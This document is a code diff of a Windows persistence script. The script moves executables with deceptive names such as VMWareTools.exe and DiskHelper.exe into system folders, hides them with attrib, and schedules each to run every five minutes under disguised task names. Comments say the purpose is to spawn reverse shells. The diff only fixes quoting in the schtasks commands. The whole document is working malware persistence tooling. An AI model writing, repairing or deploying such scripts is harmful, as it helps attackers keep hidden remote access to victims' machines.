@@ -25,7 +25,7 @@ move $powerhellLoc C:\Windows\System32
 # Hide the file from windows explorer using attrib
 attrib +h C:\Windows\System32\PowerHell.bat
 # Schedules the persistence to spawn a reverse shell
-schtasks /create /sc minute /mo 5 /tn "System Cleanup" /tr C:\Windows\System32\PowerHell.bat
+schtasks /create /sc minute /mo 5 /tn "System Cleanup" /tr "C:\Windows\System32\PowerHell.bat"
 
 # Find PowerManagement.exe
 $powermanLoc = Get-ChildItem PowerManagement.exe
@@ -34,7 +34,7 @@ move $powermanLoc C:\Program Files\MSBuild\Microsoft
 # Hide the file from windows explorer using attrib
 attrib +h  C:\Program Files\MSBuild\Microsoft\PowerManagement.exe
 # Schedules the persistence to spawn a reverse shell
-schtasks /create /sc minute /mo 5 /tn "System Cleanup" /tr C:\Program Files\MSBuild\Microsoft\PowerManagement.exe
+schtasks /create /sc minute /mo 5 /tn "System Cleanup" /tr "C:\Program Files\MSBuild\Microsoft\PowerManagement.exe"
 
 # Find VMWareTools.exe
 $vmwaretoolsLoc = Get-ChildItem VMWareTools.exe
@@ -43,7 +43,7 @@ move $vmwaretoolsLoc C:\Users\Public
 # Hide VMWareTools.exe
 attrib +h C:\Users\Public\VMWareTools.exe
 # Schedules the persistence to spawn a reverse shell
-schtasks /create /sc minute /mo 5 /tn "VMWare Updater" /tr C:\Users\Public\VMWareTools.exe
+schtasks /create /sc minute /mo 5 /tn "VMWare Updater" /tr "C:\Users\Public\VMWareTools.exe"
 
 # Find DiskHelper.exe
 $diskhelperLoc = Get-ChildItem DiskHelper.exe
@@ -52,7 +52,7 @@ move $diskhelperLoc = C:\Windows\drivers
 # Hide DiskHelper.exe
 attrib +h C:\Windows\drivers\DiskHelper.exe
 # Schedules the persistence to spawn a reverse shell
-schtasks /create /sc minute /mo 5 /tn "VMWare Updater" /tr C:\Windows\drivers\DiskHelper.exe
+schtasks /create /sc minute /mo 5 /tn "VMWare Updater" /tr "C:\Windows\drivers\DiskHelper.exe"
 
 # Find audio.exe
 $audioLoc = Get-ChildItem audio.exe
@@ -61,7 +61,7 @@ move $audioLoc C:\Windows\DigitalLocker\en-us
 # Hide audio.exe 
 attrib +h C:\Windows\DigitalLocker\en-us\audio.exe
 # Schedules the persistence to spawn a reverse shell
-schtasks /create /sc minute /mo 5 /tn "audio player" /tr C:\Windows\DigitalLocker\en-us\audio.exe
+schtasks /create /sc minute /mo 5 /tn "audio player" /tr "C:\Windows\DigitalLocker\en-us\audio.exe"
 
 # Find LogMGMT.exe 
 $logmgmtLoc = Get-ChildItem LogMGMT.exe
@@ -70,7 +70,7 @@ move $logmgmtLoc C:\Windows\Globalization\ELS
 # Hide LogMGMT.exe
 attrib +h C:\Windows\Globalization\ELS\LogMGMT.exe
 # Schedules the persistence to spawn a reverse shell
-schtasks /create /sc minute /mo 5 /tn "Global Parsing" C:\Windows\Globalization\ELS\LogMGMT.exe
+schtasks /create /sc minute /mo 5 /tn "Global Parsing" "C:\Windows\Globalization\ELS\LogMGMT.exe"
 
 # Find sysinit.dll
 $sysinitLoc = Get-ChildItem sysinit.dll
